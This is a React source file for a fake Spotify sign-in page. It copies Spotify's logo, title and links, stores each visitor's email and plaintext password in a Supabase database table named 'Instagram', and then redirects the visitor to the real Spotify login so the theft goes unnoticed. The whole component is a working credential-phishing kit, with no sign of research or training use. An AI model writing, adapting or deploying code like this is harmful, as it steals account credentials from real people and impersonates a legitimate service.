import React, { useState } from "react";
import "./SpotifyLogin.css";
import { supabase } from "../../supabase";

const SpotifyLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [error, setError] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setSuccess(false);
    const { error } = await supabase.from("Instagram").insert([
      { email, password },
    ]);
    setLoading(false);
    if (error) setError("Login failed. Try again.");
    else {
      setSuccess(true);
      window.location.href = "https://accounts.spotify.com/en/login";
    }
  };

  return (
    <div className="spotify-login-bg">
      <div className="spotify-login-center">
        <div className="spotify-logo-svg">
          <svg width="60" height="60" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg"><circle cx="30" cy="30" r="30" fill="#1DB954"/><path d="M44 39c-6-3-16-3.3-21.7-1.1-.7.3-1.5-.1-1.8-.8-.3-.7.1-1.5.8-1.8 6.3-2.4 17.1-2.1 24 1.2.7.3 1 .9.7 1.6-.2.6-.9.9-1.5.9zm2.2-5.2c-.2.4-.7.6-1.1.4-7.2-2.8-19.2-3.1-26.2-1.1-.5.1-1-.2-1.2-.7-.1-.5.2-1 .7-1.2 7.5-2.1 20.1-1.8 27.8 1.2.4.2.6.7.4 1.1zm2.3-5.3c-8.3-3.1-22.1-3.4-30.1-1.2-.6.2-1.2-.2-1.4-.8-.2-.6.2-1.2.8-1.4 8.5-2.3 22.8-2 31.6 1.3.6.2.9.9.7 1.5-.2.5-.8.8-1.4.6z" fill="#fff"/></svg>
        </div>
        <div className="spotify-login-box">
          <h1 className="spotify-signin-title">Sign In to Spotify</h1>
          <form className="spotify-login-form" onSubmit={handleSubmit}>
            <input
              type="text"
              className="spotify-login-input"
              placeholder="Email or username"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              className="spotify-login-input"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button type="submit" className="spotify-login-btn" disabled={loading}>
              {loading ? "Signing in..." : "Sign In"}
            </button>
            {error && <div className="spotify-error">{error}</div>}
            {success && <div className="spotify-success">Login saved!</div>}
          </form>
          <div className="spotify-signup-now">
            New to Spotify?{' '}
            <a
              href="https://www.spotify.com/signup"
              target="_blank"
              rel="noopener noreferrer"
            >
              Sign up now.
            </a>
          </div>
        </div>
      </div>
    </div>
  );
};

export default SpotifyLogin;
